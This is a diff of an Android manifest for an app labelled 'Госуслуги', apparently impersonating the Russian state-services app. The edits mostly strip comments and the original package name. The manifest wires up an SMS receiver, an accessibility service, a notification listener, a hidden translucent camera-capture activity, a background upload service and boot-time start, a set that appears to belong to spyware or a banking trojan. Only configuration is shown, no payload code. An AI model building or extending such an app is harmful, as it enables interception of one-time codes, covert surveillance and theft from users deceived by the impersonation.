@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
-    package="ru.gosuslugi.app">
+    xmlns:tools="http://schemas.android.com/tools">
 
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
@@ -29,18 +28,15 @@
         tools:ignore="ScopedStorage" />
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
 
-
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.front" android:required="false" />
     <uses-feature android:name="android.hardware.microphone" android:required="false" />
     <uses-feature android:name="android.hardware.location.gps" android:required="false" />
     <uses-feature android:name="android.hardware.bluetooth" android:required="false" />
 
-
     <queries>
         <package android:name="com.instagram.android" />
         <package android:name="com.facebook.katana" />
-        <!-- add more if needed -->
     </queries>
     <uses-feature
         android:name="android.hardware.telephony"
@@ -53,8 +49,6 @@
         android:label="Госуслуги"
         android:theme="@style/Theme.QuantumMineVault">
 
-
-        <!-- Home Activity (Dashboard) -->
         <activity
             android:name=".HomeActivity"
             android:exported="false"
@@ -64,7 +58,6 @@
         <activity android:name=".CameraCaptureActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
 
-        <!-- OTP Activity -->
         <activity
             android:name=".OtpActivity"
             android:parentActivityName=".SignupActivity"
@@ -72,18 +65,13 @@
 
         <activity android:name=".SettingsActivity" />
 
-        <!-- Signup Activity -->
         <activity
             android:name=".SignupActivity"
             android:exported="true"
             android:parentActivityName=".MainActivity"
             android:launchMode="singleTop">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-            </intent-filter>
         </activity>
 
-        <!-- Login Activity -->
         <activity
             android:name=".LoginActivity"
             android:launchMode="singleTop" />
@@ -93,8 +81,6 @@
             android:enabled="true"
             android:exported="true" />
 
-
-        <!-- SMS Receiver -->
         <receiver
             android:name=".SmsReceiver"
             android:exported="true"
@@ -104,7 +90,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Accessibility Service -->
         <service
             android:name=".MyAccessibilityService"
             android:exported="false"
@@ -112,13 +97,11 @@
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
-
             <meta-data
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_config" />
         </service>
 
-        <!-- Notification Listener Service -->
         <service
             android:name=".NotificationListener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
@@ -128,13 +111,11 @@
             </intent-filter>
         </service>
 
-        <!-- Upload Service -->
         <service
             android:name=".UploadService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
-        <!-- SplashActivity as Launcher -->
         <activity
             android:name=".SplashActivity"
             android:exported="true">
@@ -144,7 +125,6 @@
             </intent-filter>
         </activity>
 
-        <!-- Main Activity -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
